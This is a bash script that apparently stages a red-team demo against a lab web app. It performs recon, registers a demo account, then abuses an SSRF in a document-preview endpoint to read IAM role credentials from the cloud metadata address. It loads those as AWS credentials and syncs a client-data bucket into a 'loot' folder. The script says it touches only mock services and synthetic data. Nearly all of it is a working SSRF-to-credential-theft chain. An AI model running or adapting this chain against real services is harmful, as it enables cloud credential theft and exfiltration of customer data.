#!/usr/bin/env bash
set -euo pipefail

TARGET="https://victim"
S3_ENDPOINT="https://mock-s3"
CA="/certs/lab.crt"
ROLE_PREFIX="http://169.254.169.254/latest/meta-data/iam/security-credentials/"
DEMO_NAME="Red Team Demo"
DEMO_EMAIL="demo.attacker@example.invalid"
DEMO_PASSWORD="NorthstarDemo-2026!"
COOKIE_JAR="/tmp/northstar-demo.cookies"
REG_FILE="/tmp/northstar-register.json"
CREDENTIAL_FILE="/tmp/northstar-demo-credentials.json"

command_line() {
  printf '\n\033[1;32mkali@attacker:~$ %s\033[0m\n' "$1"
}

pause_if_interactive() {
  if [[ -t 0 ]]; then read -r -p $'\n[Enter] ' _; fi
}

printf 'kali@attacker:~$ id\n'
id

command_line 'nmap -sT -Pn -n -p 443 --reason victim'
nmap -sT -Pn -n -p 443 --reason victim

command_line 'curl --cacert /certs/lab.crt -sSI https://victim/'
curl --cacert "$CA" -sSI "$TARGET/"

command_line 'curl --cacert /certs/lab.crt -sS https://victim/robots.txt'
curl --cacert "$CA" -sS "$TARGET/robots.txt"

command_line 'curl --cacert /certs/lab.crt -sS https://victim/ | grep -Eo "/api/[A-Za-z0-9_/-]+" | sort -u'
curl --cacert "$CA" -fsS "$TARGET/" | grep -Eo '/api/[A-Za-z0-9_/-]+' | sort -u

command_line 'XDG_CONFIG_HOME=/tmp/ffuf-config ffuf -w ./paths.txt -u https://victim/FUZZ -mc all -fc 404 -k -noninteractive'
XDG_CONFIG_HOME=/tmp/ffuf-config ffuf -w ./paths.txt -u "$TARGET/FUZZ" -mc all -fc 404 -k -noninteractive
pause_if_interactive

# The fixed demo credentials are deliberately not echoed to the attacker terminal.
REG_PAYLOAD="$(jq -nc --arg name "$DEMO_NAME" --arg email "$DEMO_EMAIL" --arg password "$DEMO_PASSWORD" '{display_name:$name,email:$email,password:$password}')"
command_line "curl --cacert /certs/lab.crt -X POST $TARGET/api/auth/register -H 'Content-Type: application/json' --data-binary @- [fixed demo body not echoed]"
REG_STATUS="$(printf '%s' "$REG_PAYLOAD" | curl --cacert "$CA" -sS -o "$REG_FILE" -w '%{http_code}' -X POST "$TARGET/api/auth/register" -H 'Content-Type: application/json' --data-binary @-)"
REG_BODY="$(< "$REG_FILE")"
if [[ "$REG_STATUS" == "201" ]]; then
  DEMO_USER_ID="$(printf '%s' "$REG_BODY" | jq -r '.user.user_id')"
  printf 'HTTP 201 Created; client user ID %s\n' "$DEMO_USER_ID"
elif [[ "$REG_STATUS" == "400" ]] && [[ "$(printf '%s' "$REG_BODY" | jq -r '.error // empty')" == "an account with that demo email already exists" ]]; then
  printf 'HTTP 400: account already present; continuing with the same fixed credentials.\n'
else
  printf 'Registration failed (HTTP %s): %s\n' "$REG_STATUS" "$(printf '%s' "$REG_BODY" | jq -r '.error // .')" >&2
  exit 1
fi

command_line "curl --cacert /certs/lab.crt -X POST $TARGET/api/auth/login -H 'Content-Type: application/json' --data-binary @- [credentials not echoed]"
LOGIN_JSON="$(jq -nc --arg email "$DEMO_EMAIL" --arg password "$DEMO_PASSWORD" '{email:$email,password:$password}' | curl --cacert "$CA" -fsS -c "$COOKIE_JAR" -X POST "$TARGET/api/auth/login" -H 'Content-Type: application/json' --data-binary @-)"
SESSION_COOKIE="$(python3 -c 'import sys; from pathlib import Path; row=next(line for line in Path(sys.argv[1]).read_text().splitlines() if "ns_session" in line); print("ns_session="+row.split()[-1])' "$COOKIE_JAR")"
printf '%s\n' "$LOGIN_JSON" | jq '{authenticated,user_id:.user.user_id}'

command_line "curl --cacert /certs/lab.crt -H 'Content-Type: application/json' -H 'Cookie: ns_session=[redacted]' --data-binary '{\"url\":\"https://victim/documents/sample-statement.txt\"}' $TARGET/api/document-preview"
SAFE_PREVIEW="$(jq -nc --arg url 'https://victim/documents/sample-statement.txt' '{url:$url}' | curl --cacert "$CA" -fsS -H "Cookie: $SESSION_COOKIE" -X POST "$TARGET/api/document-preview" -H 'Content-Type: application/json' --data-binary @-)"
printf '%s\n' "$SAFE_PREVIEW" | jq .

command_line "curl --cacert /certs/lab.crt -H 'Content-Type: application/json' -H 'Cookie: ns_session=[redacted]' --data-binary '{\"url\":\"$ROLE_PREFIX\"}' $TARGET/api/document-preview"
ROLE_LIST="$(jq -nc --arg url "$ROLE_PREFIX" '{url:$url}' | curl --cacert "$CA" -fsS -H "Cookie: $SESSION_COOKIE" -X POST "$TARGET/api/document-preview" -H 'Content-Type: application/json' --data-binary @-)"
ROLE="$(printf '%s' "$ROLE_LIST" | jq -r '.body' | tr -d '\r\n')"
printf '%s\n' "$ROLE_LIST" | jq -r '"HTTP \(.http_status)\n" + (.body | rtrimstr("\n"))'
if [[ -z "$ROLE" || "$ROLE" == "null" ]]; then printf 'Metadata role was not returned; stopping.\n' >&2; exit 1; fi

CRED_URL="${ROLE_PREFIX}${ROLE}"
command_line "curl --cacert /certs/lab.crt -H 'Content-Type: application/json' -H 'Cookie: ns_session=[redacted]' --data-binary '{\"url\":\"$CRED_URL\"}' $TARGET/api/document-preview"
CREDENTIALS="$(jq -nc --arg url "$CRED_URL" '{url:$url}' | curl --cacert "$CA" -fsS -H "Cookie: $SESSION_COOKIE" -X POST "$TARGET/api/document-preview" -H 'Content-Type: application/json' --data-binary @-)"
printf '\nMetadata response (synthetic role credentials; local simulation only):\n'
printf '%s\n' "$CREDENTIALS" | jq -r '.body' | tee "$CREDENTIAL_FILE" | jq .
export AWS_ACCESS_KEY_ID="$(jq -r '.AccessKeyId' "$CREDENTIAL_FILE")"
export AWS_SECRET_ACCESS_KEY="$(jq -r '.SecretAccessKey' "$CREDENTIAL_FILE")"
export AWS_SESSION_TOKEN="$(jq -r '.Token' "$CREDENTIAL_FILE")"
export AWS_DEFAULT_REGION=us-east-1 AWS_EC2_METADATA_DISABLED=true AWS_CA_BUNDLE="$CA"
printf '\nUsing the returned temporary values through the AWS CLI environment credential provider.\n'
command_line 'aws --endpoint-url https://mock-s3 sts get-caller-identity'
aws --endpoint-url "$S3_ENDPOINT" sts get-caller-identity

printf '\n[role pivot] The returned role can enumerate the private mock object store.\n'
command_line 'aws --endpoint-url https://mock-s3 s3 ls'
aws --endpoint-url "$S3_ENDPOINT" s3 ls

command_line 'aws --endpoint-url https://mock-s3 s3 ls s3://northstar-client-data-demo/'
aws --endpoint-url "$S3_ENDPOINT" s3 ls s3://northstar-client-data-demo/

mkdir -p /home/attacker/loot
command_line 'aws --endpoint-url https://mock-s3 s3 sync s3://northstar-client-data-demo/ ./loot/'
aws --endpoint-url "$S3_ENDPOINT" s3 sync s3://northstar-client-data-demo/ /home/attacker/loot/

command_line 'cat ./loot/client-records.json'
cat /home/attacker/loot/client-records.json
printf '\nDownloaded file: /home/attacker/loot/client-records.json\n'
printf 'Victim-side audit trail: %s/security/audit\n' "$TARGET"
printf 'Only mock services and synthetic data were used. No real AWS endpoint or link-local metadata IP was contacted.\n'
